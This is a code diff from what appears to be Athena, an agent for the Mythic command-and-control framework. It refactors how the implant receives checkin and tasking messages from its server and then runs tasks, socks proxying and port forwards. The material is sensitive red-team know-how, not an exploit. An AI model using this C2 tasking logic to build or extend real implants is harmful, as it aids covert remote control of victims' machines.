@@ -13,6 +13,7 @@ using System.Linq;
 using System.Net;
 using System.Reflection;
 using System.Text;
+using System.Text.Json;
 using System.Threading.Tasks;
 using Athena.Handler.Common;
 using Athena.Handler.Proxy;
@@ -172,7 +173,7 @@ profiles.Add("Athena.Profiles.SMB");
 
                             //Subscribe to TaskingReceived events
                             Debug.WriteLine($"[{DateTime.Now}] Subscribing to OnTaskingReceived");
-                            config.SetTaskingReceived += OnTaskingReceived;
+                            config.SetMessageReceived += OnMessageReceived;
 
                             //Add profile to our tracker
                             configs.Add(config);
@@ -194,6 +195,9 @@ profiles.Add("Athena.Profiles.SMB");
         /// </summary>
         public async Task<bool> CheckIn()
         {
+
+            //Maybe update this flow to be more agnostic
+            //e.g. have a generic "HandleMessage" function that checks if the action is a checkin response or tasking, and calls the appropriate function, to make the profile development easier
             Checkin ct = new Checkin()
             {
                 action = "checkin",
@@ -210,16 +214,7 @@ profiles.Add("Athena.Profiles.SMB");
 
             try
             {
-                CheckinResponse res = await this.profile.Checkin(ct);
-
-                if(res.status == "failed")
-                {
-                    return false;
-                }
-
-                await this.updateAgentInfo(res);
-
-                return true;
+                return await this.profile.Checkin(ct);
             }
             catch (Exception e)
             {
@@ -227,20 +222,114 @@ profiles.Add("Athena.Profiles.SMB");
             }
         }
 
+
+        private async void OnMessageReceived(object sender, MessageReceivedArgs args)
+        {
+            try
+            {
+                var dic = JsonSerializer.Deserialize<Dictionary<string, object>>(args.message);
+                string action = dic["action"].ToString();
+
+                if(action == "checkin")
+                {
+                    OnCheckinReceived(JsonSerializer.Deserialize(args.message, CheckinResponseJsonContext.Default.CheckinResponse));
+                }
+                else if(action == "post_response")
+                {
+                    OnTaskingReceived(JsonSerializer.Deserialize(args.message, GetTaskingResponseJsonContext.Default.GetTaskingResponse));
+                }
+                else
+                {
+                    OnTaskingReceived(JsonSerializer.Deserialize(args.message, GetTaskingResponseJsonContext.Default.GetTaskingResponse));
+                }
+            }
+            catch (Exception e)
+            {
+                Debug.WriteLine(e.ToString());
+            }
+        }
+
+        private async void OnCheckinReceived(CheckinResponse cr)
+        {
+
+            if (cr.status == "failed")
+            {
+                Environment.Exit(0);
+            }
+
+            await this.updateAgentInfo(cr);
+        }
+
+        //private async void OnPostResponseReceived(GetTaskingResponse prr)
+        //{
+        //    if (prr.socks is not null)
+        //    {
+        //        try
+        //        {
+        //            Debug.WriteLine($"[{DateTime.Now}] Handling {prr.socks.Count} socks messages.");
+        //            HandleSocks(prr.socks);
+        //        }
+        //        catch (Exception e)
+        //        {
+        //            Debug.WriteLine(e.ToString());
+
+        //        }
+        //    }
+
+        //    if (prr.rpfwd is not null)
+        //    {
+        //        try
+        //        {
+        //            Debug.WriteLine($"[{DateTime.Now}] Handling {prr.rpfwd.Count} socks messages.");
+        //            HandleRpFwd(prr.rpfwd);
+        //        }
+        //        catch (Exception e)
+        //        {
+        //            Debug.WriteLine(e.ToString());
+
+        //        }
+        //    }
+
+        //    if (prr.delegates is not null)
+        //    {
+        //        try
+        //        {
+        //            Debug.WriteLine($"[{DateTime.Now}] Handling {prr.delegates.Count} delegates.");
+        //            HandleDelegates(prr.delegates);
+        //        }
+        //        catch (Exception e)
+        //        {
+        //            Debug.WriteLine(e.ToString());
+        //        }
+        //    }
+
+        //    if (prr.responses is not null)
+        //    {
+        //        try
+        //        {
+        //            Debug.WriteLine($"[{DateTime.Now}] Handling {prr.responses.Count} Mythic responses. (Upload/Download)");
+        //            HandleMythicResponses(prr.responses);
+        //        }
+        //        catch (Exception e)
+        //        {
+        //            Debug.WriteLine(e.ToString());
+        //        }
+        //    }
+        //}
+
         /// <summary>
         /// Parse the GetTaskingResponse and forward them to the required places
         /// </summary>
         /// <param name="responseString">Response from the Mythic server</param>
-
-        private async void OnTaskingReceived(object sender, TaskingReceivedArgs args)
+        private async void OnTaskingReceived(GetTaskingResponse gtr)
         {
             //Pass up socks messages
-            if (args.tasking_response.socks is not null)
+            if (gtr.socks is not null)
             {
                 try
                 {
-                    Debug.WriteLine($"[{DateTime.Now}] Handling {args.tasking_response.socks.Count} socks messages.");
-                    HandleSocks(args.tasking_response.socks);
+                    Debug.WriteLine($"[{DateTime.Now}] Handling {gtr.socks.Count} socks messages.");
+                    HandleSocks(gtr.socks);
                 }
                 catch (Exception e)
                 {
@@ -249,12 +338,12 @@ profiles.Add("Athena.Profiles.SMB");
                 }
             }
             
-            if (args.tasking_response.rpfwd is not null)
+            if (gtr.rpfwd is not null)
             {
                 try
                 {
-                    Debug.WriteLine($"[{DateTime.Now}] Handling {args.tasking_response.rpfwd.Count} socks messages.");
-                    HandleRpFwd(args.tasking_response.rpfwd);
+                    Debug.WriteLine($"[{DateTime.Now}] Handling {gtr.rpfwd.Count} socks messages.");
+                    HandleRpFwd(gtr.rpfwd);
                 }
                 catch (Exception e)
                 {
@@ -263,12 +352,12 @@ profiles.Add("Athena.Profiles.SMB");
                 }
             }
 
-            if (args.tasking_response.delegates is not null)
+            if (gtr.delegates is not null)
             {
                 try
                 {
-                    Debug.WriteLine($"[{DateTime.Now}] Handling {args.tasking_response.delegates.Count} delegates.");
-                    HandleDelegates(args.tasking_response.delegates);
+                    Debug.WriteLine($"[{DateTime.Now}] Handling {gtr.delegates.Count} delegates.");
+                    HandleDelegates(gtr.delegates);
                 }
                 catch (Exception e)
                 {
@@ -276,24 +365,28 @@ profiles.Add("Athena.Profiles.SMB");
                 }
             }
 
-            if (args.tasking_response.responses is not null)
+            if (gtr.responses is not null)
             {
                 try
                 {
-                    Debug.WriteLine($"[{DateTime.Now}] Handling {args.tasking_response.responses.Count} Mythic responses. (Upload/Download)");
-                    HandleMythicResponses(args.tasking_response.responses);
+                    Debug.WriteLine($"[{DateTime.Now}] Handling {gtr.responses.Count} Mythic responses. (Upload/Download)");
+                    HandleMythicResponses(gtr.responses);
                 }
                 catch (Exception e)
                 {
                     Debug.WriteLine(e.ToString());
                 }
             }
-            Parallel.ForEach(args.tasking_response.tasks, async c =>
+
+            if(gtr.tasks is not null)
             {
-                Debug.WriteLine($"[{DateTime.Now}] Executing task with ID: {c.id}");
-                //Does this need to be a Task.Run()?
-                Task.Run(() => this.commandHandler.StartJob(c));
-            });
+                Parallel.ForEach(gtr.tasks, async c =>
+                {
+                    Debug.WriteLine($"[{DateTime.Now}] Executing task with ID: {c.id}");
+                    //Does this need to be a Task.Run()?
+                    Task.Run(() => this.commandHandler.StartJob(c));
+                });
+            }
         }
 
         #endregion
